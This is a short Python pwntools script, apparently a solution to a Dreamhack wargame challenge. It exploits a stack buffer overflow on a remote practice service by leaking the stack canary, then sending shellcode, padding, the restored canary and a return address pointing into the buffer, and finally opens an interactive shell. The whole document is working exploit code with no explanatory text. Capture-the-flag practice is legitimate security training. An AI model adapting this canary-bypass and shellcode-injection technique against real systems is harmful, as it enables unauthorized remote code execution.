from pwn import *
context.arch='amd64'

def slog(n, m):
    return success(": ".join([n, hex(m)]))

shell_code = asm(shellcraft.sh())
# connect
p = remote('host3.dreamhack.games', 12434)

# find buf_address, buf2sfp, buf2canary
p.recvuntil(b"Address of the buf: ")
buf_address = int(p.recv(14), 16)
p.recvuntil(b"Distance between buf and $rbp: ")
buf2sfp = int(p.recvline().split()[0])
buf2canary = buf2sfp - 8

# print them
slog("Address of buf", buf_address)
slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2canary)

# first input
payload = b'A' * (buf2canary + 1)
p.sendafter(b"Input: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
slog("Canary", canary)

# second input
payload = shell_code # shell code
payload += b'A' * (buf2canary - len(shell_code)) # Dummies
payload += p64(canary) # Canary to be proteted
payload += b'B' * 0x8 # SFP
payload += p64(buf_address) # return address => buf address

p.sendafter(b"Input: ", payload)

p.interactive()